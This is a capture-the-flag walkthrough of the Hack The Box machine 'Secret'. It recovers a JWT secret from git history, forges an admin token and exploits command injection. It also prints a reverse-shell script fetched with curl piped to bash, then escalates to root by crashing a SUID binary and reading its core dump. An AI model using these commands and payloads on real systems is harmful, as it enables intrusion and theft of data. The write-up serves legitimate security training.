# Secret

![image](https://user-images.githubusercontent.com/56447720/143826692-f26d13a3-af54-445b-8a67-f37e6ac516e9.png)

## Basic Scans

### NMAP

```bash
# Nmap 7.91 scan initiated Sun Oct 31 00:15:29 2021 as: nmap -vvv -p 22,80,3000 -A -v -sC -sV -oN intial.nmap 10.10.11.120
Nmap scan report for secret.htb (10.10.11.120)
Host is up, received syn-ack (0.23s latency).
Scanned at 2021-10-31 00:15:31 EDT for 21s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBjDFc+UtqNVYIrxJx+2Z9ZGi7LtoV6vkWkbALvRXmFzqStfJ3UM7TuOcZcPd82vk0gFVN2/wjA3LUlbUlr7oSlD15DdJkr/XjYrZLJnG4NCxcAnbB5CIRaWmrrdGy5pJ/KgKr4UEVGDK+oAgE7wbv++el2WeD1DF8gw+GIHhtjrK1s0nfyNGcmGOwx8crtHB4xLpopAxWDr2jzMFMdGcIzZMRVLbe+TsG/8O/GFgNXU1WqFYGe4xl+MCmomjh9mUspf1WP2SRZ7V0kndJJxtRBTw6V+NQ/7EJYJPMeugOtbputyZMH+jALhzxBs07JLbw8Bh9JX+ZJl/j6VcIDfFRXxB7ceSe/cp4UYWcLqN+AsoE7k+uMCV6vmXYPNC3g5xfMMrDfVmGmrPbop0oPZUB3kr8iz5CI/qM61WI07/MME1uyM352WZHAJmeBLPAOy05ZBY+DgpVElkr0vVa+3UyKsF1dC3Qm2jisx/qh3sGauv1R8oXGHvy0+oeMOlJN+k=
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOL9rRkuTBwrdKEa+8VrwUjloHdmUdDR87hBOczK1zpwrsV/lXE1L/bYvDMUDVD0jE/aqMhekqNfBimt8aX53O0=
|   256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINM1K8Yufj5FJnBjvDzcr+32BQ9R/2lS/Mu33ExJwsci
80/tcp   open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: DUMB Docs
3000/tcp open  http    syn-ack Node.js (Express middleware)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: DUMB Docs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct 31 00:15:52 2021 -- 1 IP address (1 host up) scanned in 24.06 seconds
```

### Manual Enumeration

Just Visting websites on ports 80,3000 both looked same. Just gazing through website 2 features looks intresting.

#### Live Demo

!\[\[Pasted image 20211031095429.png]] which redirets to /api endpoint !\[\[Pasted image 20211031095516.png]] Nothing intresting for now so let's move on to the seond feature.

#### Source Code

!\[\[Pasted image 20211031095602.png]] The website seeming gives out it source code on website just like any other opensource projects. So let's download it and inspects for something good. Looking at the directory listing of source code it looks like it a git repository. It was all confirmed by ohmyzsh in my case.

```bash
➜  local-web git:(master) ls -al
total 116
drwxr-xr-x   8 kali kali  4096 Sep  3 01:57 .
drwxr-xr-x   3 kali kali  4096 Oct 31 00:28 ..
-rw-r--r--   1 kali kali    72 Sep  3 01:59 .env
drwxr-xr-x   8 kali kali  4096 Sep  8 14:33 .git
-rw-r--r--   1 kali kali   885 Sep  3 01:56 index.js
drwxr-xr-x   2 kali kali  4096 Aug 13 00:42 model
drwxr-xr-x 201 kali kali  4096 Aug 13 00:42 node_modules
-rw-r--r--   1 kali kali   491 Aug 13 00:42 package.json
-rw-r--r--   1 kali kali 69452 Aug 13 00:42 package-lock.json
drwxr-xr-x   4 kali kali  4096 Sep  3 01:54 public
drwxr-xr-x   2 kali kali  4096 Sep  3 02:32 routes
drwxr-xr-x   4 kali kali  4096 Aug 13 00:42 src
-rw-r--r--   1 kali kali   651 Aug 13 00:42 validations.js
```

I used git extractor tools to extract everything from the git archives. Link to the GitTools I Used https://github.com/internetwache/GitTools

```bash
mkdir dump
/opt/Git/GitTools/Extractor/extractor.sh local-web/ dump
```

and it will take time as it is a big repository so give it some time to complete. While that's running I did some manual enumeration. Looking at index.js we can see that the is an /api/user endpoint on auth route and auth route and it logic is defined in /route/auth. so let's check /routes/auth.js we can see there is the /register endpoint to register user so let's confirm this by sending a post request as get requests are not allowed.

```bash
➜  local-web git:(master) curl -X POST -H 'Content-Type: application/json' -v http://secret.htb/api/user/register --data '{"foo": "bar"}'
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 10.10.11.120:80...
* Connected to secret.htb (10.10.11.120) port 80 (#0)
> POST /api/user/register HTTP/1.1
> Host: secret.htb
> User-Agent: curl/7.74.0
> Accept: */*
> Content-Type: application/json
> Content-Length: 14
> 
* upload completely sent off: 14 out of 14 bytes
* Mark bundle as not supporting multiuse
< HTTP/1.1 400 Bad Request
< Server: nginx/1.18.0 (Ubuntu)
< Date: Sun, 31 Oct 2021 05:20:49 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 18
< Connection: keep-alive
< X-Powered-By: Express
< ETag: W/"12-FCVaNPnXYf0hIGYsTUTYByRq5/U"
< 
* Connection #0 to host secret.htb left intact
"name" is required
```

looks like we have a valid endpoint so let's see what data it is expecting us to send in order to register a user. Looks like it expects us to give name,email,password in order to register the user. Looks like this schema is also defined in validation.js

```js
const Joi = require('@hapi/joi')


// register validation 

const registerValidation = data =>{
    const schema = {
        name: Joi.string().min(6).required(),
        email: Joi.string().min(6).required().email(),
        password: Joi.string().min(6).required()
    };

    return Joi.validate(data, schema)
}

// login validation

const loginValidation = data => {
    const schema2 = {
        email: Joi.string().min(6).required().email(),
        password: Joi.string().min(6).required()
    };

    return Joi.validate(data, schema2)
}


module.exports.registerValidation = registerValidation
module.exports.loginValidation = loginValidation
```

so now we know that what we know how we can register and login as a user. And we can see that login endpoint creates a JWT token upon loggin in.

```js
    const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET )
    res.header('auth-token', token).send(token);
```

and now we know the location where secret is stored so we can just see it.

```bash
➜  local-web git:(master) cat .env
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = secret
```

but no luck I guess it redacted or used a dummy word but it can we in the previous commits so let's check in that dump folder.

### Git Dump Enumeration

Now we have extracted everything from Git repo we can see there is a total of 6 commit.

```bash
➜  dump ls -al
total 32
drwxr-xr-x 8 kali kali 4096 Oct 31 00:53 .
drwxr-xr-x 4 kali kali 4096 Oct 31 00:30 ..
drwxr-xr-x 7 kali kali 4096 Oct 31 00:35 0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb
drwxr-xr-x 7 kali kali 4096 Oct 31 00:39 1-55fe756a29268f9b4e786ae468952ca4a8df1bd8
drwxr-xr-x 7 kali kali 4096 Oct 31 00:43 2-e297a2797a5f62b6011654cf6fb6ccb6712d2d5b
drwxr-xr-x 7 kali kali 4096 Oct 31 00:47 3-de0a46b5107a2f4d26e348303e76d85ae4870934
drwxr-xr-x 7 kali kali 4096 Oct 31 00:53 4-3a367e735ee76569664bf7754eaaade7c735d702
drwxr-xr-x 7 kali kali 4096 Oct 31 00:57 5-67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
```

one thing that we know from above manual enumeration is that it used secret to sign JWT tokens so let's hunt for it. Looking through all the commit I found token in first 2 commits.

```bash
➜  dump cat 0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/.env
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
➜  dump cat 1-55fe756a29268f9b4e786ae468952ca4a8df1bd8/.env
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
```

So now we have the secret let's go into details of how the token is signed. you can check that on /routes/verifytoken.js

```js
const jwt = require("jsonwebtoken");

module.exports = function (req, res, next) {
    const token = req.header("auth-token");
    if (!token) return res.status(401).send("Access Denied");

    try {
        const verified = jwt.verify(token, process.env.TOKEN_SECRET);
        req.user = verified;
        next();
    } catch (err) {
        res.status(400).send("Invalid Token");
    }
};
```

let's just create a sample token using the secret found.

### Registering User

So let's register the user from our above knowledge.

```bash
➜  local-web git:(master) curl -X POST -H 'Content-Type: application/json' -v http://secret.htb/api/user/register --data '{"name": "oopsie","email": "oopsie@oops.com","password": "oopsie"}'
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 10.10.11.120:80...
* Connected to secret.htb (10.10.11.120) port 80 (#0)
> POST /api/user/register HTTP/1.1
> Host: secret.htb
> User-Agent: curl/7.74.0
> Accept: */*
> Content-Type: application/json
> Content-Length: 66
> 
* upload completely sent off: 66 out of 66 bytes
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Sun, 31 Oct 2021 05:22:38 GMT
< Content-Type: application/json; charset=utf-8
< Content-Length: 17
< Connection: keep-alive
< X-Powered-By: Express
< ETag: W/"11-MVKplfg5kMeyW9LR080TwknJb0I"
< 
* Connection #0 to host secret.htb left intact
{"user":"oopsie"}
```

We registered a user oopsie. Now let's try and login. For login we know we need to send email and password.(from validation.js)

```bash
➜  local-web git:(master) curl -X POST -H 'Content-Type: application/json' -v http://secret.htb/api/user/login --data '{"email": "oopsie@oops.com","password": "oopsie"}'
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 10.10.11.120:80...
* Connected to secret.htb (10.10.11.120) port 80 (#0)
> POST /api/user/login HTTP/1.1
> Host: secret.htb
> User-Agent: curl/7.74.0
> Accept: */*
> Content-Type: application/json
> Content-Length: 49
> 
* upload completely sent off: 49 out of 49 bytes
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Sun, 31 Oct 2021 05:24:17 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 205
< Connection: keep-alive
< X-Powered-By: Express
< auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdlMjgxZWU2N2QzZTA4NTMzOGEzZjYiLCJuYW1lIjoib29wc2llIiwiZW1haWwiOiJvb3BzaWVAb29wcy5jb20iLCJpYXQiOjE2MzU2NTc4NTd9.7v-DST155DL_5yuhC9Zbe2rdyPiGCcd8aeYUucQLVzU
< ETag: W/"cd-8bWdMB+EkctRi8EWpGcQpwBt2Iw"
< 
* Connection #0 to host secret.htb left intact
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdlMjgxZWU2N2QzZTA4NTMzOGEzZjYiLCJuYW1lIjoib29wc2llIiwiZW1haWwiOiJvb3BzaWVAb29wcy5jb20iLCJpYXQiOjE2MzU2NTc4NTd9.7v-DST155DL_5yuhC9Zbe2rdyPiGCcd8aeYUucQLVzU
```

looks like we are logged in and we have our token. now let's see if we can do something intresting with but let's first see how it validates a JWT token.

```js
const jwt = require("jsonwebtoken");

module.exports = function (req, res, next) {
    const token = req.header("auth-token");
    if (!token) return res.status(401).send("Access Denied");

    try {
        const verified = jwt.verify(token, process.env.TOKEN_SECRET);
        req.user = verified;
        next();
    } catch (err) {
        res.status(400).send("Invalid Token");
    }
};
```

looks like we just have to pass it as header in request with header name auth-token. so let's confirm it by sending it to /api/priv endpoint which just tells you if you are admin or not.

```bash
➜  local-web git:(master) curl http://secret.htb/api/priv -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdlMjgxZWU2N2QzZTA4NTMzOGEzZjYiLCJuYW1lIjoib29wc2llIiwiZW1haWwiOiJvb3BzaWVAb29wcy5jb20iLCJpYXQiOjE2MzU2NTc4NTd9.7v-DST155DL_5yuhC9Zbe2rdyPiGCcd8aeYUucQLVzU' 
{"role":{"role":"you are normal user","desc":"oopsie"}}
```

Looks like we are not admin but we have the secret we can forge the token. Let's Understand what we need to satisfy in order to be an admin it is declared in /routes/private.js so it basically checks that if name == 'theadmin' if so then it will give us the admin capabilities. Let's decode our token and find how its made. I will use jwttool for it you can use any tool of your liking you can also use their online website jwt.io which easy and pretty convinient. website: https://jwt.io/ tool: https://github.com/ticarpi/jwt\_tool

```bash
➜  Secret python /opt/Git/jwt_tool/jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdlMjgxZWU2N2QzZTA4NTMzOGEzZjYiLCJuYW1lIjoib29wc2llIiwiZW1haWwiOiJvb3Bz
aWVAb29wcy5jb20iLCJpYXQiOjE2MzU2NTc4NTd9.7v-DST155DL_5yuhC9Zbe2rdyPiGCcd8aeYUucQLVzU


        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.4                \______|             @ticarpi      

Original JWT: 

=====================
Decoded Token Values:
=====================

Token header values:
[+] alg = "HS256"
[+] typ = "JWT"

Token payload values:
[+] _id = "617e281ee67d3e085338a3f6"
[+] name = "oopsie"
[+] email = "oopsie@oops.com"
[+] iat = 1635657857    ==> TIMESTAMP = 2021-10-31 01:24:17 (UTC)

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------
```

### Forging token

```bash
➜  Secret python /opt/Git/jwt_tool/jwt_tool.py -I -S hs256 -pc 'name' -pv 'theadmin' -p 'gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE' eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdlMjgxZWU2N2QzZTA4NTMzOGEzZjYiLCJuYW1lIjoib29wc2llIiwiZW1haWwiOiJvb3BzaWVAb29wcy5jb20iLCJpYXQiOjE2MzU2NTc4NTd9.7v-DST155DL_5yuhC9Zbe2rdyPiGCcd8aeYUucQLVzU

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.4                \______|             @ticarpi      

Original JWT: 

jwttool_023763b00ef70ff48ed0e3142e2de9a1 - Tampered token - HMAC Signing:
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdlMjgxZWU2N2QzZTA4NTMzOGEzZjYiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im9vcHNpZUBvb3BzLmNvbSIsImlhdCI6MTYzNTY1Nzg1N30.atZrtL6UzhLQNDANrsNWeiv9wt4dzdYeOLaiGeNahcw
```

Now we have the forged token let's verify it at /api/priv endpoint

```bash
➜  dump curl http://secret.htb/api/priv -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdlMjgxZWU2N2QzZTA4NTMzOGEzZjYiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im9vcHNpZUBvb3BzLmNvbSIsImlhdCI6MTYzNTY1Nzg1N30.atZrtL6UzhLQNDANrsNWeiv9wt4dzdYeOLaiGeNahcw'
{"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}
```

Now we are admin. Now let's try to look at logs as we can see it in /routes/private.js We have to specify the file name as the get parameter with the name file.

```bash
➜  dump curl 'http://secret.htb/api/logs?file=/etc/passwd' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdlMjgxZWU2N2QzZTA4NTMzOGEzZjYiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im9vcHNpZUBvb3BzLmNvbSIsImlhdCI6MTYzNTY1Nzg1N30.atZrtL6UzhLQNDANrsNWeiv9wt4dzdYeOLaiGeNahcw'
{"killed":false,"code":128,"signal":null,"cmd":"git log --oneline /etc/passwd"}
```

Looks like it's a comand injection.

## Exploitation

### Command Injection

```bash
➜  dump curl 'http://secret.htb/api/logs?file=;id' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdlMjgxZWU2N2QzZTA4NTMzOGEzZjYiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im9vcHNpZUBvb3BzLmNvbSIsImlhdCI6MTYzNTY1Nzg1N30.atZrtL6UzhLQNDANrsNWeiv9wt4dzdYeOLaiGeNahcw'
"80bf34c fixed typos 🎉\n0c75212 now we can view logs from server 😃\nab3e953 Added the codes\nuid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\n"
```

Yeah so now let's to get the rev shell. Now create a shell.sh file with contents

```bash
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/<YOUR IP>/<PORT>'
```

and then host it on python server.

```bash
➜  Secret python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

and call the file using curl and pipe it out to bash

```bash
➜  dump curl 'http://secret.htb/api/logs?file=;curl+http://<YOUR IP>:8000/shell.sh+|+bash' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdlMjgxZWU2N2QzZTA4NTMzOGEzZjYiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im9vcHNpZUBvb3BzLmNvbSIsImlhdCI6MTYzNTY1Nzg1N30.atZrtL6UzhLQNDANrsNWeiv9wt4dzdYeOLaiGeNahcw'
{"killed":false,"code":1,"signal":null,"cmd":"git log --oneline ;curl http://<YOUR IP>:8000/shell.sh | bash"}
```

And boom we have the revshell

```bash
➜  Secret rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [<YOUR IP>] from (UNKNOWN) [10.10.11.120] 38614
bash: cannot set terminal process group (2131): Inappropriate ioctl for device
bash: no job control in this shell
dasith@secret:~/local-web$ id
uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)
```

## PrivESC

### SUID Binaries

```bash
find / -type f -perm -u=s 2>/dev/null
```

Gives you an intresting file with setuid at /opt/count. looking for the files in opt directory we are given the code for the binary too.

```bash
dasith@secret:/opt$ ls
code.c
count
valgrind.log
```

So let's go through the code.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/limits.h>

void dircount(const char *path, char *summary)
{
    DIR *dir;
    char fullpath[PATH_MAX];
    struct dirent *ent;
    struct stat fstat;

    int tot = 0, regular_files = 0, directories = 0, symlinks = 0;

    if((dir = opendir(path)) == NULL)
    {
        printf("\nUnable to open directory.\n");
        exit(EXIT_FAILURE);
    }
    while ((ent = readdir(dir)) != NULL)
    {
        ++tot;
        strncpy(fullpath, path, PATH_MAX-NAME_MAX-1);
        strcat(fullpath, "/");
        strncat(fullpath, ent->d_name, strlen(ent->d_name));
        if (!lstat(fullpath, &fstat))
        {
            if(S_ISDIR(fstat.st_mode))
            {
                printf("d");
                ++directories;
            }
            else if(S_ISLNK(fstat.st_mode))
            {
                printf("l");
                ++symlinks;
            }
            else if(S_ISREG(fstat.st_mode))
            {
                printf("-");
                ++regular_files;
            }
            else printf("?");
            printf((fstat.st_mode & S_IRUSR) ? "r" : "-");
            printf((fstat.st_mode & S_IWUSR) ? "w" : "-");
            printf((fstat.st_mode & S_IXUSR) ? "x" : "-");
            printf((fstat.st_mode & S_IRGRP) ? "r" : "-");
            printf((fstat.st_mode & S_IWGRP) ? "w" : "-");
            printf((fstat.st_mode & S_IXGRP) ? "x" : "-");
            printf((fstat.st_mode & S_IROTH) ? "r" : "-");
            printf((fstat.st_mode & S_IWOTH) ? "w" : "-");
            printf((fstat.st_mode & S_IXOTH) ? "x" : "-");
        }
        else
        {
            printf("??????????");
        }
        printf ("\t%s\n", ent->d_name);
    }
    closedir(dir);

    snprintf(summary, 4096, "Total entries       = %d\nRegular files       = %d\nDirectories         = %d\nSymbolic links      = %d\n", tot, regular_files, directories, symlinks);
    printf("\n%s", summary);
}


void filecount(const char *path, char *summary)
{
    FILE *file;
    char ch;
    int characters, words, lines;

    file = fopen(path, "r");

    if (file == NULL)
    {
        printf("\nUnable to open file.\n");
        printf("Please check if file exists and you have read privilege.\n");
        exit(EXIT_FAILURE);
    }

    characters = words = lines = 0;
    while ((ch = fgetc(file)) != EOF)
    {
        characters++;
        if (ch == '\n' || ch == '\0')
            lines++;
        if (ch == ' ' || ch == '\t' || ch == '\n' || ch == '\0')
            words++;
    }

    if (characters > 0)
    {
        words++;
        lines++;
    }

    snprintf(summary, 256, "Total characters = %d\nTotal words      = %d\nTotal lines      = %d\n", characters, words, lines);
    printf("\n%s", summary);
}


int main()
{
    char path[100];
    int res;
    struct stat path_s;
    char summary[4096];

    printf("Enter source file/directory name: ");
    scanf("%99s", path);
    getchar();
    stat(path, &path_s);
    if(S_ISDIR(path_s.st_mode))
        dircount(path, summary);
    else
        filecount(path, summary);

    // drop privs to limit file write
    setuid(getuid());
    // Enable coredump generation
    prctl(PR_SET_DUMPABLE, 1);
    printf("Save results a file? [y/N]: ");
    res = getchar();
    if (res == 121 || res == 89) {
        printf("Path: ");
        scanf("%99s", path);
        FILE *fp = fopen(path, "a");
        if (fp != NULL) {
            fputs(summary, fp);
            fclose(fp);
        } else {
            printf("Could not open %s for writing\n", path);
        }
    }

    return 0;
}
```

Looking at the source code the write functionality looks intresting but the problem is that we cannot write in privilleged mode and not the content of file so there is no possible way we can write something to high-privileged file or see the content of higher privileged file. The catch over here is that what if we crash the code in between the execution of the code. Most of the time if we crash the process in between the report is most of the time saved in /var/crash in linux distro. Normally this won't be possible but with this perm set prctl(PR\_SET\_DUMPABLE, 1); it could be possible. I am still not sure about what it does exactly but here is the man page for this function if you are intrested. https://man7.org/linux/man-pages/man2/prctl.2.html As far as I understand this determines whether core dumps are produced or not and by default it is always 1 so not sure why he manually did probably as a hint. As it is set to 1 we can produce core dump so let's test this thoery practically. For this we need 2 shells so first make sure you have 2 shells. 1 -> To run the count binary 2 -> To create crash

#### Shell 1

```bash
dasith@secret:/$ cd /opt
dasith@secret:/opt$ ./count -p
/root/root.txt
y

```

Now let's go to shell 2 to crash the binary

#### Shell 2

```bash
dasith@secret:/opt$ ps -aux | grep count
root         812  0.0  0.1 235664  7428 ?        Ssl  10:14   0:00 /usr/lib/accountsservice/accounts-daemon
dasith     67786  0.0  0.0   2488   580 ?        S    13:25   0:00 ./count -p
dasith     67788  0.0  0.0   6432   736 ?        S    13:25   0:00 grep --color=auto count
```

Now kill the process with the PID corresponding to ./count -p

```bash
dasith@secret:/opt$ kill -BUS 67786
```

Now you can check the shell1 if the process is been crashed.

#### Shell 1

```bash
dasith@secret:/opt$ ./count -p
/root/root.txt
y
bash: [67393: 3 (255)] tcsetattr: Inappropriate ioctl for device
```

Indeed we have crashed the process so lets check the /var/crash for the report.

```bash
dasith@secret:/opt$ cd /var/crash
dasith@secret:/opt$ ls -al
total 88
drwxrwxrwt  2 root   root    4096 Oct 31 13:24 .
drwxr-xr-x 14 root   root    4096 Aug 13 05:12 ..
-rw-r-----  1 root   root   27203 Oct  6 18:01 _opt_count.0.crash
-rw-r-----  1 dasith dasith 28127 Oct 31 13:24 _opt_count.1000.crash
-rw-r-----  1 root   root   24048 Oct  5 14:24 _opt_countzz.0.crash
dasith@secret:/opt$ mkdir /tmp/oopsie
dasith@secret:/var/crash$ apport-unpack _opt_count.1000.crash /tmp/oopsie
dasith@secret:/var/crash$ cd /tmp/oopsie
dasith@secret:/tmp/oopsie$ ls -al
total 444
drwxr-xr-x  2 dasith dasith   4096 Oct 31 13:31 .
drwxrwxrwt 16 root   root     4096 Oct 31 13:30 ..
-rw-r--r--  1 dasith dasith      5 Oct 31 13:31 Architecture
-rw-r--r--  1 dasith dasith 380928 Oct 31 13:31 CoreDump
-rw-r--r--  1 dasith dasith      1 Oct 31 13:31 CrashCounter
-rw-r--r--  1 dasith dasith     24 Oct 31 13:31 Date
-rw-r--r--  1 dasith dasith     12 Oct 31 13:31 DistroRelease
-rw-r--r--  1 dasith dasith     10 Oct 31 13:31 ExecutablePath
-rw-r--r--  1 dasith dasith     10 Oct 31 13:31 ExecutableTimestamp
-rw-r--r--  1 dasith dasith      2 Oct 31 13:31 _LogindSession
-rw-r--r--  1 dasith dasith      5 Oct 31 13:31 ProblemType
-rw-r--r--  1 dasith dasith      7 Oct 31 13:31 ProcCmdline
-rw-r--r--  1 dasith dasith      4 Oct 31 13:31 ProcCwd
-rw-r--r--  1 dasith dasith     97 Oct 31 13:31 ProcEnviron
-rw-r--r--  1 dasith dasith   2144 Oct 31 13:31 ProcMaps
-rw-r--r--  1 dasith dasith   1342 Oct 31 13:31 ProcStatus
-rw-r--r--  1 dasith dasith      1 Oct 31 13:31 Signal
-rw-r--r--  1 dasith dasith     29 Oct 31 13:31 Uname
-rw-r--r--  1 dasith dasith      3 Oct 31 13:31 UserGroups
```

We have the coredump file so let's check it out using strings or else it will give out gibberish output.

```bash
dasith@secret:/tmp/oopsie$ strings CoreDump
<----REDACTED---->
Path: esults a file? [y/N]: words      = 2
Total lines      = 2
oot/root.txt
<--REDACTED-->aa9c3c6efe<--REDACTED-->
<----REDACTED---->
```

* box pwned
